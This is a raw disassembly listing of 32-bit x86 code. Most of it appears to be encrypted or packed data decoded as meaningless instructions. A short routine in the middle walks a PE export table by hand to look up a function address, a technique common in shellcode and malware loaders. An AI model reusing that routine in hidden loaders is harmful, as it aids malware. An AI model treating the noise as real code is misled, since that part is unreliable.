  417eb7:	inc    ebx
  417eb8:	bound  esi,QWORD PTR [edx+0x40]
  417ebb:	inc    esi
  417ebc:	inc    eax
  417ebd:	xchg   BYTE PTR ds:0x18f54144,cl
  417ec3:	push   ecx
  417ec4:	pusha  
  417ec5:	add    DWORD PTR [ebx-0xe],eax
  417ec8:	pop    eax
  417ec9:	outs   dx,DWORD PTR ds:[esi]
  417eca:	inc    eax
  417ecb:	dec    esp
  417ecc:	inc    eax
  417ecd:	mov    cl,0x5a
  417ecf:	add    eax,0x4041cc
  417ed4:	add    BYTE PTR [eax],al
  417ed6:	inc    eax
  417ed7:	inc    eax
  417ed8:	inc    ebx
  417ed9:	bound  eax,QWORD PTR [eax]
  417edb:	inc    eax
  417edc:	inc    eax
  417edd:	add    eax,0x62434162
  417ee2:	inc    eax
  417ee3:	js     0x417ef5
  417ee5:	inc    ecx
  417ee6:	add    eax,0x5404325
  417eeb:	bound  eax,QWORD PTR [eax+0x40]
  417eee:	inc    ecx
  417eef:	inc    ebx
  417ef0:	push   esp
  417ef1:	sub    al,0x7f
  417ef3:	adc    al,0x19
  417ef5:	cs add eax,0x2d92f0d8
  417efb:	inc    eax
  417efc:	inc    ebx
  417efd:	inc    eax
  417efe:	xchg   BYTE PTR [eax],dl
  417f00:	jge    0x417ec1
  417f02:	inc    edi
  417f03:	outs   dx,BYTE PTR ds:[esi]
  417f04:	fwait
  417f05:	inc    eax
  417f06:	outs   dx,DWORD PTR ds:[esi]
  417f07:	pushf  
  417f08:	bound  ebx,QWORD PTR [ebp+0x25414027]
  417f0e:	mov    al,0x5
  417f10:	aaa    
  417f11:	xchg   edx,eax
  417f12:	add    BYTE PTR [esi],cl
  417f14:	and    eax,0x436241
  417f19:	adc    BYTE PTR [eax+0x0],al
  417f1c:	add    eax,0x62410040
  417f21:	inc    eax
  417f22:	add    BYTE PTR [ebx-0x34],al
  417f25:	inc    eax
  417f26:	add    eax,0x78434040
  417f2b:	bound  eax,QWORD PTR [ecx+0x78]
  417f2e:	add    eax,0x62404043
  417f33:	aad    0x40
  417f35:	add    eax,0x406244cd
  417f3a:	inc    eax
  417f3b:	jne    0x417f71
  417f3d:	xchg   BYTE PTR [edx],dl
  417f3f:	(bad)  
  417f40:	shl    BYTE PTR [ecx],1
  417f42:	(bad)  
  417f44:	inc    eax
  417f45:	pusha  
  417f46:	lods   al,BYTE PTR ds:[esi]
  417f47:	rol    DWORD PTR [edi+0x6c],0x40
  417f4b:	jp     0x417f6e
  417f4d:	scas   eax,DWORD PTR es:[edi]
  417f4e:	adc    eax,0x9dc25fc
  417f53:	fiadd  DWORD PTR [eax+0x5]
  417f56:	retf   
  417f57:	inc    ecx
  417f58:	inc    eax
  417f59:	add    eax,0x43436240
  417f5e:	add    eax,0x62004040
  417f63:	inc    eax
  417f64:	add    BYTE PTR [ecx+0x40],al
  417f67:	inc    ebx
  417f68:	test   BYTE PTR ds:0x58054041,ah
  417f6e:	inc    eax
  417f6f:	inc    eax
  417f70:	bound  eax,QWORD PTR [eax+0x66]
  417f73:	inc    ecx
  417f74:	inc    eax
  417f75:	add    eax,0x43da5300
  417f7a:	inc    eax
  417f7b:	xor    DWORD PTR [esi+eax*4],eax
  417f7e:	inc    eax
  417f7f:	sub    BYTE PTR [eax+0x405714d1],0x33
  417f86:	sub    bh,BYTE PTR [ecx+edi*2-0xaadbfb3]
  417f8d:	scas   al,BYTE PTR es:[edi]
  417f8e:	inc    edi
  417f8f:	push   edx
  417f90:	adc    ah,BYTE PTR [edi+0x5c6bb03]
  417f96:	ss test al,0x62
  417f99:	jg     0x417f9b
  417f9b:	add    BYTE PTR [ebx+0x40],al
  417f9e:	bound  eax,QWORD PTR ds:0x25404110
  417fa4:	add    ah,cl
  417fa6:	inc    ebx
  417fa7:	add    eax,0x40402562
  417fac:	add    BYTE PTR [eax+0x40],al
  417faf:	inc    ecx
  417fb0:	inc    ecx
  417fb1:	add    eax,0x78434025
  417fb6:	bound  eax,QWORD PTR [eax-0x7c]
  417fb9:	inc    eax
  417fba:	inc    ecx
  417fbb:	inc    eax
  417fbc:	and    al,0x6d
  417fbe:	xchg   BYTE PTR [eax+0x15adc510],ch
  417fc4:	or     edx,edi
  417fc6:	aaa    
  417fc7:	gs mov ah,0xbc
  417fca:	sub    BYTE PTR [eax+0x31],al
  417fcd:	cmp    ebp,DWORD PTR [ebp+0x4264c240]
  417fd3:	adc    al,BYTE PTR [edx+0x14]
  417fd6:	add    eax,0x16c62301
  417fdb:	inc    eax
  417fdc:	jno    0x417fdf
  417fde:	xchg   BYTE PTR [eax],dl
  417fe0:	cmp    BYTE PTR [ecx-0x70],0x14
  417fe4:	jnp    0x41802c
  417fe6:	inc    ecx
  417fe7:	inc    eax
  417fe8:	inc    eax
  417fe9:	inc    ebx
  417fea:	int3   
  417feb:	add    BYTE PTR ds:0x56240,al
  417ff1:	inc    ebx
  417ff2:	inc    eax
  417ff3:	inc    eax
  417ff4:	add    BYTE PTR [ecx+0x62],al
  417ff7:	bound  eax,QWORD PTR [eax]
  417ff9:	int3   
  417ffa:	inc    eax
  417ffb:	inc    ebx
  417ffc:	add    eax,0x43624041
  418001:	adc    BYTE PTR [ecx+0x5],al
  418004:	inc    eax
  418005:	das    
  418006:	sub    bl,al
  418008:	inc    ecx
  418009:	bound  eax,QWORD PTR [eax-0x30]
  41800c:	inc    ebp
  41800d:	lods   al,BYTE PTR ds:[esi]
  41800e:	pushf  
  41800f:	push   ds
  418010:	bound  eax,QWORD PTR [eax+0x13]
  418013:	xor    BYTE PTR [edx+0x68860505],dl
  418019:	xor    BYTE PTR [eax+0x9],al
  41801c:	jg     0x417fa4
  41801e:	xchg   DWORD PTR [edx-0x58],esp
  418021:	ins    BYTE PTR es:[edi],dx
  418022:	push   cs
  418023:	nop
  418024:	inc    eax
  418025:	and    al,0x44
  418027:	dec    eax
  418028:	data16 stc 
  41802a:	inc    eax
  41802b:	jp     0x418061
  41802d:	stos   DWORD PTR es:[edi],eax
  41802e:	push   edi
  41802f:	or     BYTE PTR [ecx],al
  418031:	bound  eax,QWORD PTR [ebx+0x40]
  418034:	adc    BYTE PTR ds:0x4158cc40,al
  41803a:	inc    ebx
  41803b:	bound  eax,QWORD PTR [ecx+0x40]
  41803e:	add    eax,0x4140
  418043:	and    eax,0x40400062
  418048:	add    eax,0x84404340
  41804d:	int3   
  41804e:	js     0x418050
  418050:	inc    ecx
  418051:	adc    BYTE PTR [edx+0xf],ah
  418054:	inc    ebx
  418055:	or     DWORD PTR [esi+ebx*1+0x5],eax
  418059:	cmp    BYTE PTR [eax-0x2fbf2ed4],ah
  41805f:	xor    eax,DWORD PTR [esi+0x636a36ac]
  418065:	pop    ds
  418066:	xor    eax,0x2a052102
  41806b:	mov    ah,0x0
  41806d:	inc    eax
  41806e:	inc    ecx
  41806f:	inc    eax
  418070:	inc    ebx
  418071:	bound  ax,DWORD PTR ds:0x40434100
  418078:	add    eax,0x40054062
  41807d:	bound  eax,QWORD PTR [ecx+0x40]
  418080:	inc    ebx
  418081:	inc    eax
  418082:	add    eax,0x25405841
  418087:	bound  eax,QWORD PTR [eax+0x43]
  41808a:	inc    eax
  41808b:	adc    BYTE PTR [ecx+0x40],bh
  41808e:	xor    al,0x14
  418090:	stos   BYTE PTR es:[edi],al
  418091:	xchg   DWORD PTR [eax*1+0x304114cd],esi
  418098:	add    eax,0xda6d1f17
  41809d:	inc    eax
  41809e:	xor    cl,ah
  4180a0:	mov    ecx,0x24
  4180a5:	add    esi,ecx
  4180a7:	mov    ecx,DWORD PTR [esi]
  4180a9:	shl    eax,1
  4180ab:	add    ecx,eax
  4180ad:	mov    eax,DWORD PTR [ebp-0x4]
  4180b0:	add    ecx,eax
  4180b2:	movzx  eax,WORD PTR [ecx]
  4180b5:	sub    esi,0x24
  4180b8:	mov    ecx,DWORD PTR [esi+0x1c]
  4180bb:	lea    eax,[ecx+eax*4]
  4180be:	mov    ecx,DWORD PTR [ebp-0x4]
  4180c1:	mov    eax,DWORD PTR [ecx+eax*1]
  4180c4:	ret    
  4180c5:	int3   
  4180c6:	int3   
  4180c7:	int3   
  4180c8:	int3   
  4180c9:	int3   
  4180ca:	int3   
  4180cb:	int3   
  4180cc:	int3   
  4180cd:	int3   
  4180ce:	int3   
  4180cf:	int3   
  4180d0:	es test eax,0x47d0243c
  4180d6:	pusha  
  4180d7:	arpl   WORD PTR [ebx-0x54],dx
  4180da:	and    ax,0x5540
  4180de:	lods   al,BYTE PTR ds:[esi]
  4180df:	(bad)  
  4180e0:	mov    ah,0x59
  4180e2:	js     0x418108
  4180e4:	inc    ecx
  4180e5:	inc    eax
  4180e6:	inc    eax
  4180e7:	inc    ebx
  4180e8:	int3   
  4180e9:	add    BYTE PTR ds:0x56240,al
  4180ef:	inc    ebx
  4180f0:	inc    eax
  4180f1:	inc    eax
  4180f2:	add    BYTE PTR [ecx+0x62],al
  4180f5:	bound  eax,QWORD PTR [eax]
  4180f7:	int3   
  4180f8:	inc    eax
  4180f9:	inc    ebx
  4180fa:	add    eax,0x43624041
  4180ff:	adc    BYTE PTR [ecx+0x5],al
  418102:	inc    eax
  418103:	xor    al,BYTE PTR [eax+0x57]
  418106:	fcom   QWORD PTR ds:0x402f68af
  41810c:	dec    edx
  41810d:	inc    ebx
  41810e:	enter  0x6acb,0x41
  418112:	and    esi,DWORD PTR [eax+eax*2]
  418115:	in     al,0x45
  418117:	push   ds
  418118:	jo     0x4180c6
  41811a:	cs push 0xab35a14d
  418120:	cld    
  418121:	lock and eax,0x163c1840
  418127:	fs push 0x40602ca8
  41812d:	and    eax,0x105a5ba8
  418132:	xor    al,BYTE PTR [eax+0x6e]
  418135:	bound  edx,QWORD PTR [eax]
  418137:	push   eax
  418138:	bound  eax,QWORD PTR [ebx+0x40]
  41813b:	adc    BYTE PTR ds:0x4158cc40,al
  418141:	inc    ebx
  418142:	bound  eax,QWORD PTR [ecx+0x40]
  418145:	add    eax,0x4140
  41814a:	and    eax,0x40400062
  41814f:	add    eax,0x84404340
  418154:	int3   
  418155:	js     0x418157
  418157:	inc    ecx
  418158:	adc    BYTE PTR [edx+0xf],ah
  41815b:	sub    al,0x64
  41815d:	xor    eax,0xb441cd33
  418162:	addr16 pop ebx
  418164:	jg     0x4181d3
  418166:	inc    eax
  418167:	inc    ecx
  418168:	hlt    
  418169:	inc    ecx
  41816a:	push   ds
  41816b:	mov    BYTE PTR [edx+0x2d],ah
  41816e:	and    DWORD PTR [ebx-0x9],edi
  418171:	ja     0x4181ca
  418173:	push   esp
  418174:	dec    esp
  418175:	xor    al,BYTE PTR [eax+0x41]
  418178:	frstor [eax*1+0x302f343b]
  41817f:	arpl   WORD PTR [eax+0x6edd2a64],bp
  418185:	add    BYTE PTR es:[eax+0x41],al
  418189:	inc    eax
  41818a:	inc    ebx
  41818b:	bound  ax,DWORD PTR ds:0x40434100
  418192:	add    eax,0x40054062
  418197:	bound  eax,QWORD PTR [ecx+0x40]
  41819a:	inc    ebx
  41819b:	inc    eax
  41819c:	add    eax,0x25405841
  4181a1:	bound  eax,QWORD PTR [eax+0x43]
  4181a4:	inc    eax
  4181a5:	adc    BYTE PTR [eax+0x40],al
  4181a8:	adc    BYTE PTR [ebx+eiz*2+0x43],cl
  4181ac:	cld    
  4181ad:	ins    DWORD PTR es:[edi],dx
  4181ae:	imul   BYTE PTR [eax]
  4181b0:	inc    edx
  4181b1:	or     bh,BYTE PTR [esi-0x68]
  4181b4:	push   ebx
  4181b5:	aaa    
  4181b6:	adc    al,0x21
  4181b8:	inc    edx
  4181b9:	mov    cl,0x1c
  4181bb:	imul   edx,esi,0xf1430b37
  4181c1:	bound  esp,QWORD PTR [edx-0x80]
  4181c4:	inc    eax
  4181c5:	aaa    
  4181c6:	cmc    
  4181c7:	jnp    0x418229
  4181c9:	add    bh,BYTE PTR [eax-0x2926f8d]
  4181cf:	inc    eax
  4181d0:	(bad)  
  4181d1:	retf   
  4181d2:	inc    eax
  4181d3:	inc    ecx
  4181d4:	inc    ebx
  4181d5:	inc    eax
  4181d6:	add    eax,0x43406262
  4181db:	inc    ecx
  4181dc:	adc    BYTE PTR [eax],al
  4181de:	inc    eax
  4181df:	add    eax,0x43000562
  4181e4:	add    BYTE PTR [ecx+0x40],al
  4181e7:	inc    eax
  4181e8:	add    eax,0x400062
  4181ed:	inc    ebx
  4181ee:	inc    eax
  4181ef:	js     0x418232
  4181f1:	inc    ecx
  4181f2:	bound  eax,QWORD PTR [eax+0x30]
  4181f5:	fld    TBYTE PTR [esi+0x38]
  4181f8:	cmc    
  4181f9:	jnp    0x418252
  4181fb:	dec    esp
  4181fc:	bound  ebp,QWORD PTR [ebx+0x60ca6fb9]
  418202:	int3   
  418203:	push   edi
  418204:	cs inc esp
  418206:	mov    bl,0x2e
  418208:	xchg   ebx,eax
  418209:	inc    ecx
  41820a:	ins    BYTE PTR es:[edi],dx
  41820b:	sub    esp,DWORD PTR [ebx+ebp*4-0x58]
  41820f:	das    
  418210:	or     eax,DWORD PTR [eax-0x45]
  418213:	(bad)  
  418214:	mov    ch,0xbf
  418216:	inc    edx
  418217:	sub    DWORD PTR [edi+0x2c],esi
  41821a:	mov    ds:0x2a886424,al
  41821f:	xor    al,0x4b
  418221:	push   ebp
  418222:	mov    dh,dh
  418224:	pop    edi
  418225:	ret    
  418226:	inc    edx
  418227:	and    DWORD PTR [ecx+0x62fc6240],esi
  41822d:	inc    eax
  41822e:	add    eax,0x40430041
  418233:	inc    eax
  418234:	inc    ecx
  418235:	inc    eax
  418236:	inc    eax
  418237:	bound  eax,QWORD PTR ds:0x5624300
  41823d:	add    BYTE PTR [eax+0x40],al
  418240:	add    BYTE PTR [ecx+0x43],al
  418243:	add    BYTE PTR [eax+0x41],al
  418246:	add    eax,0x40436200
  41824b:	inc    eax
  41824c:	add    eax,0x43459462
  418251:	and    ebx,DWORD PTR [edi+0x37]
  418254:	sbb    eax,0x4035ec41
  418259:	sub    DWORD PTR [edi-0x1d],eax
  41825c:	or     BYTE PTR [edi+0x4],al
  41825f:	dec    eax
  418260:	nop
  418261:	sub    al,0xb2
  418263:	inc    ecx
  418264:	bound  eax,QWORD PTR [ecx+0x3069809a]
  41826a:	sub    ebp,edi
  41826c:	jo     0x4182d5
  41826e:	es mov eax,0x415d3042
  418274:	push   ds
  418275:	inc    esp
  418276:	inc    ecx
  418277:	inc    eax
  418278:	add    eax,0x41624340
  41827d:	test   BYTE PTR [eax],al
  41827f:	and    eax,0x404043
  418284:	add    BYTE PTR ds:0x626210,al
  41828a:	add    eax,0x43404140
  41828f:	inc    eax
  418290:	inc    ecx
  418291:	add    eax,0x10664062
  418296:	inc    ebx
  418297:	bound  edi,QWORD PTR [edi]
  418299:	fs dec esp
  41829b:	and    DWORD PTR [ecx+0x4f],edx
  41829e:	xchg   ebp,eax
  41829f:	cmp    al,0x20
  4182a1:	leave  
  4182a2:	push   esp
  4182a3:	pusha  
  4182a4:	ja     0x4182e8
  4182a6:	(bad)  
  4182a7:	(bad)
  4182ab:	jp     0x4182ff
  4182ad:	pop    ss
  4182ae:	inc    ecx
  4182af:	test   al,0xc4
  4182b1:	js     0x418253
  4182b3:	and    eax,0xc23c342d
  4182b8:	dec    edi
  4182b9:	and    BYTE PTR [eax],0x30
  4182bc:	pop    ebx
  4182bd:	pop    ebp
  4182be:	ja     0x4182e6
  4182c0:	arpl   WORD PTR fs:[edx+0x39],bp
  4182c4:	add    eax,0x4041cc
  4182c9:	add    BYTE PTR [eax],al
  4182cb:	inc    eax
  4182cc:	inc    eax
  4182cd:	inc    ebx
  4182ce:	bound  eax,QWORD PTR [eax]
  4182d0:	inc    eax
  4182d1:	inc    eax
  4182d2:	add    eax,0x62434162
  4182d7:	inc    eax
  4182d8:	js     0x4182ea
  4182da:	inc    ecx
  4182db:	add    eax,0x5404325
  4182e0:	bound  eax,QWORD PTR [eax+0x40]
  4182e3:	inc    ecx
  4182e4:	inc    ebx
  4182e5:	aaa    
  4182e6:	inc    eax
  4182e7:	mov    eax,0xf9009f40
  4182ec:	adc    al,0xf4
  4182ee:	ss or  eax,0x4012621c
  4182f4:	ins    DWORD PTR es:[edi],dx
  4182f5:	rol    DWORD PTR [eax+0x7b],cl
  4182f8:	rol    DWORD PTR ds:0xf8348295,1
  4182fe:	sub    DWORD PTR [ecx+0x27],eax
  418301:	inc    ebx
  418302:	arpl   WORD PTR [ebx],bp
  418304:	shl    DWORD PTR cs:[ecx+0x33],1
  418308:	fcom   QWORD PTR [eax+edx*1+0x42]
  41830c:	and    eax,0x69c540f7
  418311:	add    eax,0x2534ea94
  418316:	inc    ecx
  418317:	bound  eax,QWORD PTR [ebx+0x0]
  41831a:	adc    BYTE PTR [eax+0x0],al
  41831d:	add    eax,0x62410040
  418322:	inc    eax
  418323:	add    BYTE PTR [ebx-0x34],al
  418326:	inc    eax
  418327:	add    eax,0x78434040
  41832c:	bound  eax,QWORD PTR [ecx+0x78]
  41832f:	add    eax,0x62404043
  418334:	inc    ebx
  418335:	xor    BYTE PTR [esp+ebx*8+0x43],cl
  418339:	jge    0x41830f
  41833b:	cs push ecx
  41833d:	jns    0x418380
  41833f:	inc    edx
  418340:	mov    eax,0x552f6262
  418345:	dec    eax
  418346:	lds    eax,FWORD PTR ds:[ebx-0x50]
  41834a:	cli    
  41834b:	add    esi,ecx
  41834d:	add    eax,0x73594f68
  418352:	gs inc eax
  418354:	dec    ecx
  418355:	daa    
  418356:	xor    al,0x41
  418358:	inc    eax
  418359:	add    eax,0x43436240
  41835e:	add    eax,0x62004040
  418363:	inc    eax
  418364:	add    BYTE PTR [ecx+0x40],al
  418367:	inc    ebx
  418368:	test   BYTE PTR ds:0x58054041,ah
  41836e:	inc    eax
  41836f:	inc    eax
  418370:	bound  eax,QWORD PTR [eax+0x66]
  418373:	inc    ecx
  418374:	inc    eax
  418375:	add    eax,0x5bc7d00
  41837a:	sub    eax,0x41431140
  41837f:	push   ebx
  418380:	push   ebx
  418381:	fs gs inc eax
  418384:	pop    ecx
  418385:	inc    ecx
  418386:	cmp    eax,0x47acf662
  41838b:	inc    eax
  41838c:	xor    eax,0xa8917f57
  418391:	add    eax,0x405b9934
  418396:	inc    edi
  418397:	bound  esp,QWORD PTR [ecx+ecx*8-0x80]
  41839b:	stos   BYTE PTR es:[edi],al
  41839c:	mov    ch,0x29
  41839e:	inc    ecx
  41839f:	std    
  4183a0:	cmc    
  4183a1:	add    BYTE PTR [eax],al
  4183a3:	inc    ebx
  4183a4:	inc    eax
  4183a5:	bound  eax,QWORD PTR ds:0x25404110
  4183ab:	add    ah,cl
  4183ad:	inc    ebx
  4183ae:	add    eax,0x40402562
  4183b3:	add    BYTE PTR [eax+0x40],al
  4183b6:	inc    ecx
  4183b7:	inc    ecx
  4183b8:	add    eax,0x78434025
  4183bd:	bound  eax,QWORD PTR [eax-0x7c]
  4183c0:	inc    eax
  4183c1:	inc    ecx
  4183c2:	inc    edx
  4183c3:	lds    edi,FWORD PTR [edx+ebp*2-0x27]
  4183c7:	cmp    eax,0x5443a863
  4183cc:	fwait
  4183cd:	push   edi
  4183ce:	inc    edx
  4183cf:	jae    0x418356
  4183d1:	adc    cl,BYTE PTR [eax+0x42]
  4183d4:	xchg   edx,eax
  4183d5:	inc    ecx
  4183d6:	inc    eax
  4183d7:	inc    eax
  4183d8:	inc    ebx
  4183d9:	int3   
  4183da:	add    BYTE PTR ds:0x56240,al
  4183e0:	inc    ebx
  4183e1:	inc    eax
  4183e2:	inc    eax
  4183e3:	add    BYTE PTR [ecx+0x62],al
  4183e6:	bound  eax,QWORD PTR [eax]
  4183e8:	int3   
  4183e9:	inc    eax
  4183ea:	inc    ebx
  4183eb:	add    eax,0x43624041
  4183f0:	adc    BYTE PTR [ecx+0x5],al
  4183f3:	inc    eax
  4183f4:	push   0x22
  4183f6:	stos   DWORD PTR es:[edi],eax
  4183f7:	cmp    BYTE PTR [eax+0x5f155605],dh
  4183fd:	inc    eax
  4183fe:	call   0x2085c562
  418403:	enter  0x2fee,0x72
  418407:	in     al,dx
  418408:	call   0x73543e52
  41840d:	sub    BYTE PTR ds:0x682c18a8,dh
  418413:	(bad)  
  418414:	mov    edi,0x62104115
  418419:	mov    eax,ds:0x49cf8ea8
  41841e:	bound  eax,QWORD PTR [ebx+0x40]
  418421:	adc    BYTE PTR ds:0x4158cc40,al
  418427:	inc    ebx
  418428:	bound  eax,QWORD PTR [ecx+0x40]
  41842b:	add    eax,0x4140
  418430:	and    eax,0x40400062
  418435:	add    eax,0x84404340
  41843a:	int3   
  41843b:	js     0x41843d
  41843d:	inc    ecx
  41843e:	adc    BYTE PTR [edx+0xf],ah
  418441:	cmp    eax,0x4a28cbf4
  418446:	mov    dl,bl
  418448:	dec    ebx
  418449:	lds    eax,FWORD PTR ds:0xa8378157
  41844f:	ins    BYTE PTR es:[edi],dx
  418450:	inc    ecx
  418451:	dec    esp
  418452:	retf   
  418453:	fld    st(3)
  418455:	inc    eax
  418456:	rol    DWORD PTR [eax],1
  418458:	inc    eax
  418459:	inc    ecx
  41845a:	inc    eax
  41845b:	inc    ebx
  41845c:	bound  ax,DWORD PTR ds:0x40434100
  418463:	add    eax,0x40054062
  418468:	bound  eax,QWORD PTR [ecx+0x40]
  41846b:	inc    ebx
  41846c:	inc    eax
  41846d:	add    eax,0x25405841
  418472:	bound  eax,QWORD PTR [eax+0x43]
  418475:	inc    eax
  418476:	adc    BYTE PTR [ecx],dh
  418478:	gs jnp 0x4184bf
  41847b:	push   edx
  41847c:	mov    eax,0x4266612a
  418481:	mov    eax,0x5b3e0a68
  418486:	xchg   esi,eax
  418487:	push   ecx
  418488:	sub    DWORD PTR [ecx-0x3c],eax
  41848b:	js     0x418464
  41848d:	xor    ch,BYTE PTR [eax-0x38]
  418490:	(bad)  gs:[ebx+eiz*2]
  418494:	test   al,0x8d
  418496:	inc    eax
  418497:	mov    bl,0x40
  418499:	sbb    al,0xd8
  41849b:	or     edx,DWORD PTR [ecx+0x2e544024]
  4184a1:	inc    eax
  4184a2:	inc    ecx
  4184a3:	inc    ebx
  4184a4:	inc    eax
  4184a5:	add    eax,0x43406262
  4184aa:	inc    ecx
  4184ab:	adc    BYTE PTR [eax],al
  4184ad:	inc    eax
  4184ae:	add    eax,0x43000562
  4184b3:	add    BYTE PTR [ecx+0x40],al
  4184b6:	inc    eax
  4184b7:	add    eax,0x400062
  4184bc:	inc    ebx
  4184bd:	inc    eax
  4184be:	js     0x418501
  4184c0:	inc    ecx
  4184c1:	bound  eax,QWORD PTR [eax+0x62]
  4184c4:	test   al,0x80
  4184c6:	mov    esp,0x7ff34016
  4184cb:	stos   DWORD PTR es:[edi],eax
  4184cc:	adc    dl,BYTE PTR [edi+edx*8+0x34]
  4184d0:	inc    eax
  4184d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184d2:	inc    eax
  4184d3:	call   0x80ad2d78
  4184d8:	fist   DWORD PTR [esi+0x23]
  4184db:	fs adc eax,0xf5c55311
  4184e1:	cs stos BYTE PTR es:[edi],al
  4184e3:	xchg   ebx,eax
  4184e4:	inc    ebx
  4184e5:	mov    esp,0xa8804148
  4184ea:	push   ds
  4184eb:	fadd   st,st(7)
  4184ed:	push   eax
  4184ee:	stos   BYTE PTR es:[edi],al
  4184ef:	bound  eax,QWORD PTR [eax+0x5]
  4184f2:	inc    ecx
  4184f3:	add    BYTE PTR [ebx+0x40],al
  4184f6:	inc    eax
  4184f7:	inc    ecx
  4184f8:	inc    eax
  4184f9:	inc    eax
  4184fa:	bound  eax,QWORD PTR ds:0x5624300
  418500:	add    BYTE PTR [eax+0x40],al
  418503:	add    BYTE PTR [ecx+0x43],al
  418506:	add    BYTE PTR [eax+0x41],al
  418509:	add    eax,0x40436200
  41850e:	inc    eax
  41850f:	add    eax,0x73e74662
  418514:	dec    eax
  418515:	aad    0xec
  418517:	aaa    
  418518:	ret    
  418519:	fadd   QWORD PTR [edi-0x43]
  41851c:	cs jl  0x418550
  41851f:	sbb    bh,BYTE PTR [esp+eiz*2-0x3cf5c635]
  418526:	xor    BYTE PTR [ecx+eax*2+0x22],bl
  41852a:	ds jne 0x418572
  41852d:	mov    esp,0xa80a648c
  418532:	inc    ecx
  418533:	inc    eax
  418534:	add    eax,0x41624340
  418539:	test   BYTE PTR [eax],al
  41853b:	and    eax,0x404043
  418540:	add    BYTE PTR ds:0x626210,al
  418546:	add    eax,0x43404140
  41854b:	inc    eax
  41854c:	inc    ecx
  41854d:	add    eax,0x10664062
  418552:	inc    ebx
  418553:	bound  ecx,QWORD PTR [ecx-0x38]
  418556:	xor    dl,BYTE PTR ds:0x12d0600d
  41855c:	jecxz  0x418571
  41855e:	inc    edx
  41855f:	retf   
  418560:	jnp    0x4185ae
  418562:	mov    esp,0x29417d4c
  418567:	mov    esp,0x150762b0
  41856c:	dec    eax
  41856d:	shl    DWORD PTR [esi+0x46],1
  418570:	or     eax,0x2acbddf0
  418575:	dec    edi
  418576:	inc    edx
  418577:	popf   
  418578:	retf   
  418579:	inc    esp
  41857a:	outs   dx,BYTE PTR ds:[esi]
  41857b:	inc    esp
  41857c:	mov    edi,0x4041cc05
  418581:	add    BYTE PTR [eax],al
  418583:	add    BYTE PTR [eax+0x40],al
  418586:	inc    ebx
  418587:	bound  eax,QWORD PTR [eax]
  418589:	inc    eax
  41858a:	inc    eax
  41858b:	add    eax,0x62434162
  418590:	inc    eax
  418591:	js     0x4185a3
  418593:	inc    ecx
  418594:	add    eax,0x5404325
  418599:	bound  eax,QWORD PTR [eax+0x40]
  41859c:	inc    ecx
  41859d:	inc    ebx
  41859e:	push   ecx
  41859f:	and    al,0xb8
  4185a1:	mov    edi,0x63625865
  4185a6:	ss push edx
  4185a8:	arpl   WORD PTR [edi+0x6bd4623d],di
  4185ae:	cdq    
  4185af:	inc    eax
  4185b0:	mov    esp,0x63029cbe
  4185b5:	jno    0x418604
  4185b7:	cmc    
  4185b8:	jo     0x418575
  4185ba:	mov    esp,0xd3322ae0
  4185bf:	sub    DWORD PTR [ecx],edi
  4185c1:	lds    eax,FWORD PTR [ebp-0x37]
  4185c4:	sub    al,0x94
  4185c6:	and    eax,0x436241
  4185cb:	adc    BYTE PTR [eax+0x0],al
  4185ce:	add    eax,0x62410040
  4185d3:	inc    eax
  4185d4:	add    BYTE PTR [ebx-0x34],al
  4185d7:	inc    eax
  4185d8:	add    eax,0x78434040
  4185dd:	bound  eax,QWORD PTR [ecx+0x78]
  4185e0:	add    eax,0x62404043
  4185e5:	inc    ebx
  4185e6:	jb     0x4185f6
  4185e8:	dec    edi
  4185e9:	adc    eax,0x35c03462
  4185ee:	inc    eax
  4185ef:	test   al,0x8c
  4185f1:	push   ebx
  4185f2:	pop    ds
  4185f3:	fdivrp st(3),st
  4185f5:	(bad)  
  4185f6:	sub    DWORD PTR [ebp+0x5],esp
  4185f9:	outs   dx,BYTE PTR ds:[esi]
  4185fa:	ss jecxz 0x41865f
  4185fd:	jno    0x41862d
  4185ff:	mov    eax,0x6240c07b
  418604:	or     al,0xbf
  418606:	inc    edx
  418607:	addr16 mov al,0x5e
  41860a:	mov    ah,0x40
  41860c:	xchg   ebx,eax
  41860d:	jp     0x41863f
  41860f:	or     DWORD PTR [ebp+0x7f],0x75e81b41
  418616:	inc    eax
  418617:	addr16 jp 0x41865b
  41861a:	inc    eax
  41861b:	add    eax,0x43436240
  418620:	add    eax,0x62004040
  418625:	inc    eax
  418626:	add    BYTE PTR [ecx+0x40],al
  418629:	inc    ebx
  41862a:	test   BYTE PTR ds:0x58054041,ah
  418630:	inc    eax
  418631:	inc    eax
  418632:	bound  eax,QWORD PTR [eax+0x66]
  418635:	inc    ecx
  418636:	inc    eax
  418637:	add    eax,0xc99ec800
  41863c:	and    ch,BYTE PTR [edx]
  41863e:	xor    esp,DWORD PTR [edi]
  418640:	add    BYTE PTR [edx-0x3c],ah
  418643:	bound  ebp,QWORD PTR [eax-0x2b]
  418646:	sub    ch,BYTE PTR [edi+0x62]
  418649:	or     DWORD PTR [ebx+0x5],esp
  41864c:	int3   
  41864d:	gs dec eax
  41864f:	fiadd  WORD PTR [edx+0x70]
  418652:	cmp    al,0x87
  418654:	sti    
  418655:	je     0x418668
  418657:	or     BYTE PTR [ebx+eiz*2],dh
  41865a:	push   eax
  41865b:	inc    edi
  41865c:	jg     0x4185e5
  41865e:	xor    al,BYTE PTR [eax]
  418660:	add    BYTE PTR [ebx+0x40],al
  418663:	bound  eax,QWORD PTR ds:0x25404110
  418669:	add    ah,cl
  41866b:	inc    ebx
  41866c:	add    eax,0x40402562
  418671:	add    BYTE PTR [eax+0x40],al
  418674:	inc    ecx
  418675:	inc    ecx
  418676:	add    eax,0x78434025
  41867b:	bound  eax,QWORD PTR [eax-0x7c]
  41867e:	inc    eax
  41867f:	inc    ecx
  418680:	xchg   ebp,eax
  418681:	inc    eax
  418682:	push   esi
  418683:	or     al,0xab
  418685:	mov    bh,0x62
  418687:	ds icebp 
  418689:	clc    
  41868a:	test   eax,0x93d64168
  41868f:	inc    eax
  418690:	bound  eax,QWORD PTR [ecx-0x5c]
  418693:	jmp    0x4186db
  418695:	inc    ecx
  418696:	inc    eax
  418697:	inc    eax
  418698:	inc    ebx
  418699:	int3   
  41869a:	add    BYTE PTR ds:0x56240,al
  4186a0:	inc    ebx
  4186a1:	inc    eax
  4186a2:	inc    eax
  4186a3:	add    BYTE PTR [ecx+0x62],al
  4186a6:	bound  eax,QWORD PTR [eax]
  4186a8:	int3   
  4186a9:	inc    eax
  4186aa:	inc    ebx
  4186ab:	add    eax,0x43624041
  4186b0:	adc    BYTE PTR [ecx+0x5],al
  4186b3:	inc    eax
